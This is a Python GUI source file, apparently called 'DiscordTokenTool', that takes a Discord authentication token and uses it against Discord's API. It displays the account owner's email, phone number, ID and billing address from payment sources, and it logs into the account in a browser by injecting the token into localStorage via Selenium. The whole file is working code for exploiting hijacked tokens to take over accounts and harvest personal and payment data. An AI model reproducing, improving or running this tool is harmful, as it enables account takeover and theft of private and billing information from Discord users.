from selenium import webdriver
import tkinter as tk
from tkinter import ttk
from tkinter import Toplevel
from tkinter.ttk import *
import requests
import json
import webbrowser

#-------Window------
root = tk.Tk()
root.title("DiscordTokenTool")
root.geometry("400x510")
root.resizable(width=False, height=False)


def tokeninfo():
    token = tokenentry.get()
    head = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    src = requests.get(
        'https://canary.discordapp.com/api/v6/users/@me', headers=head, timeout=10)
    response = json.loads(src.content)
    if src.status_code == 403:
        print("Token Is Invalid")
        infovar.set("Token Is Invalid")
    elif src.status_code == 401:
        print("Token Is Invalid")
        infovar.set("Token Is Invalid")
    else:
        print(f"Token Is Valid")
        print(response)
        info = f'''\n   Name: {response['username']}#{response['discriminator']}   ID: {response['id']}\n   Email: {response['email']}   Phone: {response['phone']}\n   Verified: {response['verified']}          MFA: {response['nsfw_allowed']}\n   AvatarURL: https://cdn.discordapp.com/avatars/{response['id']}/{response['avatar']}.png?size=1024'''
        print(info)
        infovar.set("Succes")
        Namevar.set("Username: "+ response['username'])
        discvar.set("#"+ response['discriminator'])
        IDvar.set("ID: "+ response['id'])
        Mailvar.set("Mail: "+ response['email'])
        phonevar.set("Phone: "+ f"{response['phone']}")
        verifyvar.set("Verified: "+ f"{response['verified']}")
        MFAvar.set("NSFW: "+ f"{response['nsfw_allowed']}")
        payment(token=token)


def tokenLogin():
    token = tokenentry.get()
    head = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    src = requests.get('https://discord.com/api/v6/users/@me', headers=head, timeout=10)
    if src.status_code == 403:
        print("Token Is Invalid")
        infovar.set("Token Is Invalid")
    elif src.status_code == 401:
        print("Token Is Invalid")
        infovar.set("Token Is Invalid")
    else:
        opts = webdriver.ChromeOptions()
        opts.add_experimental_option("detach", True)
        chrome = webdriver.Chrome('chromedriver.exe', options=opts)
        script = """
              function login(token) {
              setInterval(() => {
              document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
              }, 50);
              setTimeout(() => {
              location.reload();
              }, 2500);
              }
              """
        chrome.get("https://discord.com/login")
        chrome.execute_script(script + f'\nlogin("{token}")')
        infovar.set("Logged In")


def payment(token):
    payEmail.set(" ")
    payCountry.set(" ")
    payCity.set(" ")
    payState.set(" ")
    payLine1.set(" ")
    payLine2.set(" ")
    payPostCode.set(" ")
    headers = {
        "authorization": token
    }
    src = requests.get(
        'https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers, timeout=10)
    response = src.json()
    payEmail.set("Email: " + response[0]['email'])
    payCountry.set("Country: " + response[0]['billing_address']['country'])
    payCity.set("City: " + response[0]['billing_address']['city'])
    payState.set("State: " + response[0]['billing_address']['state'])
    payLine1.set("adress 1: " + f"{response[0]['billing_address']['line_1']}")
    payLine2.set("adress 2: " + f"{response[0]['billing_address']['line_2']}")
    payPostCode.set("Postal Code: " + response[0]['billing_address']['postal_code'])

    
def url():
    webbrowser.open('https://github.com/Zombiebattler')

    
def creds():
    top = Toplevel()
    top.title("")
    top.geometry("200x125")
    top.resizable(width=False, height=False)

    Label(top, text="Credits",font=(300)).pack()
    Label(top).pack()
    Label(top, text=f"Tool Made by\nZombiebattler#9961",justify="center").pack()
    Label(top).pack()
    tk.Button(top, text="https://github.com/Zombiebattler", command=url).pack()
    Label(top).pack()


#------Variables------
infovar = tk.StringVar()
Namevar = tk.StringVar()
discvar = tk.StringVar()
IDvar = tk.StringVar()
Mailvar = tk.StringVar()
phonevar = tk.StringVar()
verifyvar = tk.StringVar()
MFAvar = tk.StringVar()

payEmail = tk.StringVar()

payLine1 = tk.StringVar()
payLine2 = tk.StringVar()
payCity = tk.StringVar()
payState = tk.StringVar()
payCountry = tk.StringVar()
payPostCode = tk.StringVar()



abstand1 = tk.Label(root).pack()

tokenentry = ttk.Entry(root, foreground="green",justify="left", width=60)
tokenentry.pack()

abstand2 = tk.Label(root).pack()

buttoninfo = tk.Button(root, text="Token Info", width=60, command=tokeninfo)
buttonlogin = tk.Button(root, text="Login with Token", width=60, command=tokenLogin)
buttoninfo.pack()
buttonlogin.pack()

abstand3 = tk.Label(root).pack()

infolabel = tk.Label(root, textvariable=infovar).pack()

abstand4 = tk.Label(root).pack()

Name = tk.Label(root, textvariable=Namevar, fg="green").pack()
discriminator = tk.Label(root, textvariable=discvar, fg="green").pack()
ID = tk.Label(root, textvariable=IDvar, fg="green").pack()
Mail = tk.Label(root, textvariable=Mailvar, fg="green").pack()
Phone = tk.Label(root, textvariable=phonevar, fg="green").pack()
verify = tk.Label(root, textvariable=verifyvar, fg="green").pack()
MFA = tk.Label(root, textvariable=MFAvar, fg="green").pack()

PayInfo = tk.Label(root, text="Payment Information (If avaible)", fg="red").pack()

Paymail = tk.Label(root, textvariable=payEmail, fg="green").pack()
PayCountry = tk.Label(root, textvariable=payCountry, fg="green").pack()
PayState = tk.Label(root, textvariable=payState, fg="green").pack()
PayPostCode = tk.Label(root, textvariable=payPostCode, fg="green").pack()
PayCity = tk.Label(root, textvariable=payCity, fg="green").pack()
PayLine1 = tk.Label(root, textvariable=payLine1, fg="green").pack()
PayLine2 = tk.Label(root, textvariable=payLine2, fg="green").pack()

cred = tk.Button(root, text="Credits", width=60, command=creds)
cred.pack()

root.mainloop()
